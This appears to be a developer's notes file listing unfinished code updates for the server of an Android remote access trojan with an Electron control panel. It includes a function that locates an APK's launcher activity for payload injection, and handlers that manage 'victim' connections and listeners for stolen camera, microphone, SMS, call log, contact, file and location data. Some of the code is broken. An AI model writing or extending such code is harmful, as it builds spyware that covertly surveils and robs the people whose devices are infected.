# Server Updates that still need work

All of the following code updates for the server, currently need more work done on them before they can be integrated.

# Launcher Extraction for `<application` attribute | AppCtrl.js |
```javascript
function GetLauncherActivity(manifest) {


    var regex = /(<application)/gi,
        result, indices = [];
    while ((result = regex.exec(manifest))) {
        indices.push(result.index);
    }

    var indexOfLauncher = manifest.indexOf(
        'android.intent.action.MAIN'
        'android.intent.category.LAUNCHER',
        +
        'android.intent.action.MAIN'
        'android.intent.category.INFO',
        );
    var indexOfActivity = -1;
    
    if (indexOfLauncher != -1) {
        manifest = manifest.substring(0, indexOfLauncher);
        for (var i = indices.length - 1; i >= 0; i--) {
            if (indices[i] < indexOfLauncher) {
                indexOfActivity = indices[i];
                manifest = manifest.substring(indexOfActivity, manifest.length);
                break;
            }
        }


        if (indexOfActivity != -1) {

            if (manifest.indexOf('android:targetActivity="') != -1) {
                manifest = manifest.substring(manifest.indexOf('android:targetActivity="') + 24);
                manifest = manifest.substring(0, manifest.indexOf('"'))
                manifest = manifest.replace(/\./g, "/");
                manifest = manifest.substring(manifest.lastIndexOf("/") + 1) + ".smali"
                return manifest;

            } else {
                manifest = manifest.substring(manifest.indexOf('android:name="') + 14);
                manifest = manifest.substring(0, manifest.indexOf('"'))
                manifest = manifest.replace(/\./g, "/");
                manifest = manifest.substring(manifest.lastIndexOf("/") + 1) + ".smali"
                return manifest;
            }

        }
    }
    return -1;



  }
```
# Code for Disconnect function
- AppCtrl.js

Once this is done it will alow users to disconnect their own victim connections via the click of a `Disconnect` button
```javascript
    // when user clicks Disconnect Button
    $appCtrl.Stop = (port) => {
      if (!port) {
        port = CONSTANTS.defaultPort;
      }
      
      //notify the main process to disconnect the port
      ipcRenderer.send('SocketIO:StopListen', port);
      $appCtrl.Log("Stopped Listening on Port: " + port, CONSTANTS.logStatus.SUCCESS);
    }

    //fired when main process sends any notification about the ServerDisconnect 
    ipcRenderer.on('SocketIO:ServerDisconnect', (event, index) => {
      delete viclist[index];
      $appCtrl.$apply();
    });

    // fired if stopping the listener brings error
    ipcRenderer.on("SocketIO:StopListen", (event, error) => {
      $appCtrl.Log(error, CONSTANTS.logStatus.FAIL);
      $appCtrl.$apply()
  });

    //notify the main process to close the lab
    $appCtrl.closeLab = (index) => {
      ipcRenderer.send('closeLabWindow', 'lab.html', index)
    }
```
- main.js
```javascript 
// fired when stopped listening for victim
ipcMain.on("SocketIO:StopListen", function (event, port) {

  IO.close();
  IO.sockets.on('connection', function (socket) {
    // decrease socket count on Disconnect
    socket.on('disconnect', function () {
      victimList.rmVictim(index)

      // notify the renderer process about the Server Disconnection
      win.webContents.send('SocketIO:ServerDisconnect', index);

      if (windows[index]) {
        // notify the renderer process about the Disconnected Server
        windows[index].webContents.send('SocketIO:ServerDisconnected', index);
        // delete the windows from the windowList
        delete windows[index];
      }
    });
  });
});


ipcMain.on("closeLabWindow", function (event, index) {
  delete windows[index];
  //on lab window closed remove all socket listners
  if (victimsList.getVictim(index).socket) {
    victimsList.getVictim(index).socket.removeAllListeners("x0000ca"); // camera
    victimsList.getVictim(index).socket.removeAllListeners("x0000fm"); // file manager
    victimsList.getVictim(index).socket.removeAllListeners("x0000sm"); // sms
    victimsList.getVictim(index).socket.removeAllListeners("x0000cl"); // call logs
    victimsList.getVictim(index).socket.removeAllListeners("x0000cn"); // contacts
    victimsList.getVictim(index).socket.removeAllListeners("x0000mc"); // mic
    victimsList.getVictim(index).socket.removeAllListeners("x0000lm"); // location
  }
});

//handle the Uncaught Exceptions
process.on('uncaughtException', function (error) {

  if (error.code == "EADDRINUSE" || error.code == "ENOTCONN") {
    win.webContents.send('SocketIO:Listen', "Address Already in Use");
  } else {
    win.webContents.send('SocketIO:StopListen', "Server is not Listening");
  } // end of if

});
```
- index.html
```html
<button ng-click="isListen=false;Stop(port);" class="ui labeled icon black button"><i class="terminal icon" ></i>Stop</button>
```
